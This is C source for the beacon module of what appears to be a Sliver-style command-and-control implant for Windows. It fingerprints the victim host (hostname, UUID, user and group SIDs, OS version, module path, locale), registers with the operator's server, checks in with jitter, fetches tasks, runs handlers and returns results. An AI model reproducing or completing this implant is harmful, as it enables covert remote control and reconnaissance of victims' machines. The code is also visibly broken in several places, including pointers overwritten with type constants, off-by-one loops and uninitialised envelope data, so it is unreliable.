#include "pch.h"

PBEACON_TASK UnmarshalBeaconTasks
(
	_In_ PENVELOPE pEnvelope
)
{
	LPVOID* pUnmarshaledData = NULL;
	LPVOID* pUnmarshaledEnvelope = NULL;
	PPBElement RecvElements[3];
	PPBElement EnvelopeElements[4];
	DWORD i = 0;
	PBEACON_TASK pResult = NULL;
	PBUFFER* BufferList = NULL;
	DWORD dwNumberOfEnvelopes = 0;

	for (i = 0; i < _countof(RecvElements); i++) {
		RecvElements[i] = ALLOC(sizeof(PPBElement));
		RecvElements[i]->dwFieldIdx = i + 1;
	}

	for (i = 0; i < _countof(EnvelopeElements); i++) {
		EnvelopeElements[i] = ALLOC(sizeof(PPBElement));
		EnvelopeElements[i]->dwFieldIdx = i + 1;
		EnvelopeElements[i]->Type = Varint;
	}

	RecvElements[0] = Bytes;
	RecvElements[1] = RepeatedBytes;
	RecvElements[2] = Varint;
	EnvelopeElements[2]->Type = Bytes;

	pUnmarshaledData = UnmarshalStruct(RecvElements, _countof(RecvElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	pResult = ALLOC(sizeof(BEACON_TASK));
	pResult->lpInstanceID = DuplicateStrA(((PBUFFER)pUnmarshaledData[0])->pBuffer, 0);
	pResult->dwNextCheckin = ((PUINT64)pUnmarshaledData)[2];
	BufferList = (PBUFFER*)pUnmarshaledData[1];
	dwNumberOfEnvelopes = *((PUINT64)BufferList);
	
	pResult->EnvelopeList = ALLOC(dwNumberOfEnvelopes * sizeof(PENVELOPE));
	for (i = 1; i <= dwNumberOfEnvelopes; i++) {
		pResult->EnvelopeList[i] = ALLOC(sizeof(ENVELOPE));
		pUnmarshaledEnvelope = UnmarshalStruct(EnvelopeElements, _countof(EnvelopeElements), BufferList[i]->pBuffer, BufferList[i]->cbBuffer, NULL);
		pResult->EnvelopeList[i]->uID = (UINT64)pUnmarshaledEnvelope[0];
		pResult->EnvelopeList[i]->uType = (UINT64)pUnmarshaledEnvelope[1];
		pResult->EnvelopeList[i]->uUnknownMessageType = (UINT64)pUnmarshaledEnvelope[3];
		pResult->EnvelopeList[i]->pData = (PBUFFER)pUnmarshaledEnvelope[2];
		pUnmarshaledEnvelope[2] = NULL;
		FREE(pUnmarshaledEnvelope);
	}

CLEANUP:
	if (pUnmarshaledData != NULL) {
		FreeBuffer((PBUFFER)pUnmarshaledData[0]);
		if (BufferList != NULL) {
			for (i = 1; i <= dwNumberOfEnvelopes; i++) {
				FreeBuffer(BufferList[i]);
			}

			FREE(BufferList);
		}
		
		FREE(pUnmarshaledData);
	}

	for (i = 0; i < _countof(RecvElements); i++) {
		FREE(RecvElements[i]);
	}

	for (i = 0; i < _countof(EnvelopeElements); i++) {
		FREE(EnvelopeElements[i]);
	}

	return pResult;
}

PENVELOPE MarshalBeaconTasks
(
	_In_ PSLIVER_BEACON_CLIENT pBeaconClient,
	_In_ DWORD dwNextCheckin,
	_In_ PENVELOPE* pTasksResult,
	_In_ DWORD dwNumberOfTasks
)
{
	PENVELOPE pResult = NULL;
	PPBElement BeaconTasksElements[3];
	PPBElement pFinalElement = NULL;
	PBUFFER* MarshaledTasks = NULL;
	DWORD i = 0;

	BeaconTasksElements[0] = CreateBytesElement(pBeaconClient->szInstanceID, lstrlenA(pBeaconClient->szInstanceID), 1);
	BeaconTasksElements[2] = CreateVarIntElement(dwNextCheckin, 3);
	if (pTasksResult != NULL) {
		MarshaledTasks = ALLOC(sizeof(PBUFFER) * dwNumberOfTasks);
		for (i = 0; i < dwNumberOfTasks; i++) {
			MarshaledTasks[i] = MarshalEnvelope(pTasksResult[i]);
		}

		BeaconTasksElements[1] = CreateRepeatedBytesElement(MarshaledTasks, dwNumberOfTasks, 2);
	}
	
	pFinalElement = CreateStructElement(BeaconTasksElements, _countof(BeaconTasksElements), 0);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uType = MsgBeaconTasks;
	pResult->pData = ALLOC(sizeof(BUFFER));
	pResult->pData->pBuffer = pFinalElement->pMarshalledData;
	pResult->pData = pFinalElement->pMarshalledData;
	pFinalElement->pMarshalledData = NULL;
	pFinalElement->pMarshalledData = 0;
CLEANUP:
	if (MarshaledTasks != NULL) {
		FREE(MarshaledTasks);
	}

	FreeElement(pFinalElement);

	return pResult;
}

DWORD GetNextCheckin
(
	_In_ PSLIVER_BEACON_CLIENT pBeaconClient
)
{
	DWORD dwResult = 0;

	dwResult = pBeaconClient->dwInterval + GenRandomNumber32(0, pBeaconClient->dwJitter);
	return dwResult;
}

BOOL BeaconRegister
(
	_In_ PSLIVER_BEACON_CLIENT pBeaconClient
)
{
	LPSTR lpUUID = NULL;
	LPSTR lpFullQualifiedName = NULL;
	LPSTR lpUserSid = NULL;
	LPSTR lpGroupSid = NULL;
	SYSTEM_INFO SystemInfo;
	RTL_OSVERSIONINFOW OsVersion;
	LPSTR lpVersion = NULL;
	LPSTR lpHostName = NULL;
	LPSTR lpArch = NULL;
	LPSTR lpModulePath = NULL;
	DWORD cbModulePath = MAX_PATH;
	DWORD dwReturnedLength = 0;
	DWORD dwLastError = 0;
	LPSTR lpLocaleName = NULL;
	WCHAR wszLocale[0x20];
	BOOL Result = FALSE;
	CHAR szOsName[] = "windows";

	PPBElement pFinalElement = NULL;
	PPBElement ElementList[17];
	PPBElement BeaconRegElements[5];
	ENVELOPE RegisterEnvelope;

	lpUUID = GetHostUUID();
	if (lpUUID == NULL) {
		goto CLEANUP;
	}

	lpUUID[lstrlenA(lpUUID) - 1] = '\0';
	lpFullQualifiedName = GetComputerUserName();
	if (lpFullQualifiedName == NULL) {
		goto CLEANUP;
	}

	lpUserSid = GetCurrentProcessUserSID();
	if (lpUserSid == NULL) {
		goto CLEANUP;
	}

	lpGroupSid = GetCurrentProcessGroupSID();
	if (lpGroupSid == NULL) {
		goto CLEANUP;
	}

	SecureZeroMemory(&OsVersion, sizeof(OsVersion));
	OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
	if (!GetOsVersion(&OsVersion)) {
		LOG_ERROR("GetOsVersion", GetLastError());
		goto CLEANUP;
	}

	SecureZeroMemory(&SystemInfo, sizeof(SystemInfo));
	GetNativeSystemInfo(&SystemInfo);
	lpVersion = ALLOC(0x100);
	wsprintfA(lpVersion, "%d build %d", OsVersion.dwMajorVersion, OsVersion.dwBuildNumber);
	if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
		lstrcatA(lpVersion, " x86_64");
		lpArch = DuplicateStrA("amd64", 0);
	}
	else if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
		lstrcatA(lpVersion, " x86");
		lpArch = DuplicateStrA("386", 0);
	}
	else {
		lpArch = DuplicateStrA("(NULL)", 0);
	}

	lpHostName = GetHostName();
	lpModulePath = ALLOC(cbModulePath + 1);
	while (TRUE) {
		SecureZeroMemory(lpModulePath, cbModulePath + 1);
		dwReturnedLength = GetModuleFileNameA(NULL, lpModulePath, cbModulePath);
		dwLastError = GetLastError();
		if (dwLastError == ERROR_INSUFFICIENT_BUFFER) {
			cbModulePath *= 2;
			lpModulePath = REALLOC(lpModulePath, cbModulePath + 1);
		}

		break;
	}

	GetSystemDefaultLocaleName(wszLocale, _countof(wszLocale));
	lpLocaleName = ConvertWcharToChar(wszLocale);

	SecureZeroMemory(ElementList, sizeof(ElementList));
	ElementList[0] = CreateBytesElement(pBeaconClient->GlobalConfig.szSliverName, lstrlenA(pBeaconClient->GlobalConfig.szSliverName), 1);
	ElementList[1] = CreateBytesElement(lpHostName, lstrlenA(lpHostName), 2);
	ElementList[2] = CreateBytesElement(lpUUID + 1, lstrlenA(lpUUID + 1), 3);
	ElementList[3] = CreateBytesElement(lpFullQualifiedName, lstrlenA(lpFullQualifiedName), 4);
	ElementList[4] = CreateBytesElement(lpUserSid, lstrlenA(lpUserSid), 5);
	ElementList[5] = CreateBytesElement(lpGroupSid, lstrlenA(lpGroupSid), 6);
	ElementList[6] = CreateBytesElement(szOsName, lstrlenA(szOsName), 7);
	ElementList[7] = CreateBytesElement(lpArch, lstrlenA(lpArch), 8);
	ElementList[8] = CreateVarIntElement(GetCurrentProcessId(), 9);
	ElementList[9] = CreateBytesElement(lpModulePath, lstrlenA(lpModulePath), 10);
	ElementList[11] = CreateBytesElement(lpVersion, lstrlenA(lpVersion), 12);
	ElementList[12] = CreateVarIntElement(pBeaconClient->uReconnectInterval, 13);
	ElementList[14] = CreateBytesElement(pBeaconClient->GlobalConfig.szConfigID, lstrlenA(pBeaconClient->GlobalConfig.szConfigID), 16);
	ElementList[15] = CreateVarIntElement(pBeaconClient->GlobalConfig.uPeerID, 17);
	ElementList[16] = CreateBytesElement(lpLocaleName, lstrlenA(lpLocaleName), 18);
	
	BeaconRegElements[0] = CreateBytesElement(pBeaconClient->szInstanceID, lstrlenA(pBeaconClient), 1);
	BeaconRegElements[1] = CreateVarIntElement(pBeaconClient->dwInterval, 2);
	BeaconRegElements[2] = CreateVarIntElement(pBeaconClient->dwJitter, 3);
	BeaconRegElements[3] = CreateStructElement(ElementList, _countof(ElementList), 4);
	BeaconRegElements[4] = CreateVarIntElement(GetNextCheckin(pBeaconClient), 5);

	pFinalElement = CreateStructElement(BeaconRegElements, _countof(BeaconRegElements), 0);
	RegisterEnvelope.pData->pBuffer = pFinalElement->pMarshalledData;
	RegisterEnvelope.pData->cbBuffer = pFinalElement->cbMarshalledData;
	RegisterEnvelope.uType = MsgBeaconRegister;
	pFinalElement->pMarshalledData = NULL;
	Result = pBeaconClient->Send(&pBeaconClient->GlobalConfig, pBeaconClient->lpClient, &RegisterEnvelope);
CLEANUP:
	if (lpHostName != NULL) {
		FREE(lpHostName);
	}

	if (lpUUID != NULL) {
		FREE(lpUUID);
	}

	if (lpFullQualifiedName != NULL) {
		FREE(lpFullQualifiedName);
	}

	if (lpUserSid != NULL) {
		FREE(lpUserSid);
	}

	if (lpGroupSid != NULL) {
		FREE(lpGroupSid);
	}

	if (lpArch != NULL) {
		FREE(lpArch);
	}

	if (lpModulePath != NULL) {
		FREE(lpModulePath);
	}

	if (lpVersion != NULL) {
		FREE(lpVersion);
	}

	if (lpLocaleName != NULL) {
		FREE(lpLocaleName);
	}

	FreeElement(pFinalElement);
	return Result;
}

PENVELOPE* BeaconHandleTaskList
(
	_In_ PENVELOPE* Tasks,
	_In_ DWORD dwNumberOfTasks
)
{
	DWORD i = 0;
	SYSTEM_HANDLER SystemTaskHandler;
	LPVOID* HandlerList = NULL;
	PENVELOPE* pResult = NULL;

	pResult = ALLOC(sizeof(PENVELOPE) * dwNumberOfTasks);
	for (i = 0; i < dwNumberOfTasks; i++) {
		HandlerList = GetSystemHandler();
		SystemTaskHandler = HandlerList[Tasks[i]->uType];
		if (SystemTaskHandler != NULL) {
			pResult[i] = SystemTaskHandler(Tasks[i]);
		}

		// Cac handler con lai

		pResult[i] = ALLOC(sizeof(ENVELOPE));
		pResult[i]->uID = Tasks[i]->uID;
		pResult[i]->uUnknownMessageType = 1;
	}

	if (HandlerList != NULL) {
		FREE(HandlerList);
	}

	return pResult;
}

VOID FreeBeaconTask
(
	_In_ PBEACON_TASK pBeaconTask
)
{
	DWORD i = 0;

	if (pBeaconTask != NULL) {
		if (pBeaconTask->lpInstanceID != NULL) {
			FREE(pBeaconTask->lpInstanceID);
		}

		if (pBeaconTask->EnvelopeList != NULL) {
			for (i = 0; i < pBeaconTask->dwNumberOfEnvelopes; i++) {
				FreeEnvelope(pBeaconTask->EnvelopeList[i]);
			}

			FREE(pBeaconTask->EnvelopeList);
		}
		
		FREE(pBeaconTask);
	}
}

VOID FreeBeaconClient
(
	_In_ PSLIVER_BEACON_CLIENT pBeaconClient
)
{
	if (pBeaconClient != NULL) {
		if (pBeaconClient->lpClient != NULL) {
			pBeaconClient->Close(pBeaconClient->lpClient);
			FREE(pBeaconClient->lpClient);
		}

		if (pBeaconClient->GlobalConfig.pSessionKey != NULL) {
			FREE(pBeaconClient->GlobalConfig.pSessionKey);
		}

		if (pBeaconClient->GlobalConfig.lpRecipientPubKey != NULL) {
			FREE(pBeaconClient->GlobalConfig.lpRecipientPubKey);
		}

		if (pBeaconClient->GlobalConfig.lpPeerPubKey != NULL) {
			FREE(pBeaconClient->GlobalConfig.lpPeerPubKey);
		}

		if (pBeaconClient->GlobalConfig.lpPeerPrivKey != NULL) {
			FREE(pBeaconClient->GlobalConfig.lpPeerPrivKey);
		}

		if (pBeaconClient->GlobalConfig.lpServerMinisignPublicKey != NULL) {
			FREE(pBeaconClient->GlobalConfig.lpServerMinisignPublicKey);
		}

		FREE(pBeaconClient);
	}
}

VOID BeaconMain
(
	_In_ PSLIVER_BEACON_CLIENT pBeaconClient
)
{
	LPSTR lpUuid = NULL;
	//LPVOID* 
	DWORD i = 0;
	PENVELOPE pNextCheckinEnvelope = NULL;
	PENVELOPE pRecvEnvelope = NULL;
	PBEACON_TASK BeaconTask = NULL;
	PENVELOPE* TaskResults = NULL;
	PENVELOPE pSendEnvelope = NULL;

	pBeaconClient->lpClient = pBeaconClient->Init();
	if (pBeaconClient->lpClient == NULL) {
		goto CLEANUP;
	}

	if (!pBeaconClient->Start(&pBeaconClient->GlobalConfig, pBeaconClient->lpClient)) {
		goto CLEANUP;
	}

	lpUuid = GenerateUUIDv4();
	lstrcpyA(pBeaconClient->szInstanceID, lpUuid);
	if (!BeaconRegister(pBeaconClient)) {
		goto CLEANUP;
	}

	pNextCheckinEnvelope = MarshalBeaconTasks(pBeaconClient, GetNextCheckin(pBeaconClient), NULL, 0);
	if (!pBeaconClient->Send(&pBeaconClient->GlobalConfig, pBeaconClient->lpClient, pNextCheckinEnvelope)) {
		goto CLEANUP;
	}

	pRecvEnvelope = pBeaconClient->Receive(&pBeaconClient->GlobalConfig, pBeaconClient->lpClient);
	if (pRecvEnvelope == NULL) {
		goto CLEANUP;
	}

	BeaconTask = UnmarshalBeaconTasks(pRecvEnvelope);
	TaskResults = BeaconHandleTaskList(BeaconTask->EnvelopeList, BeaconTask->dwNumberOfEnvelopes);
	if (TaskResults == NULL) {
		goto CLEANUP;
	}

	pSendEnvelope = MarshalBeaconTasks(pBeaconClient, GetNextCheckin(pBeaconClient), TaskResults, BeaconTask->dwNumberOfEnvelopes);
	if (!pBeaconClient->Send(&pBeaconClient->GlobalConfig, pBeaconClient->lpClient, pSendEnvelope)) {
		goto CLEANUP;
	}

CLEANUP:
	if (lpUuid != NULL) {
		FREE(lpUuid);
	}

	FreeBeaconTask(BeaconTask);
	FreeEnvelope(pNextCheckinEnvelope);
	FreeEnvelope(pRecvEnvelope);
	FreeEnvelope(pSendEnvelope);
	if (TaskResults != NULL) {
		for (i = 0; i < BeaconTask->dwNumberOfEnvelopes; i++) {
			FreeEnvelope(TaskResults[i]);
		}

		FREE(TaskResults);
	}
}

PSLIVER_BEACON_CLIENT BeaconInit
(
	_In_ PGLOBAL_CONFIG pGlobalConfig
)
{
	PSLIVER_BEACON_CLIENT pBeaconClient = NULL;
	UINT64 uReconnectInterval = 300;

	pBeaconClient = ALLOC(sizeof(SLIVER_BEACON_CLIENT));
	pBeaconClient->uReconnectInterval = uReconnectInterval;
	memcpy(&pBeaconClient->GlobalConfig, pGlobalConfig, sizeof(GLOBAL_CONFIG));
#ifdef __DRIVE__
	pBeaconClient->Init = (CLIENT_INIT)DriveInit;
	pBeaconClient->Start = DriveStart;
	pBeaconClient->Send = DriveSend;
	pBeaconClient->Receive = DriveRecv;
	pBeaconClient->Close = DriveClose;
	pBeaconClient->Cleanup = FreeDriveClient;
#else
#endif

CLEANUP:
	return pBeaconClient;
}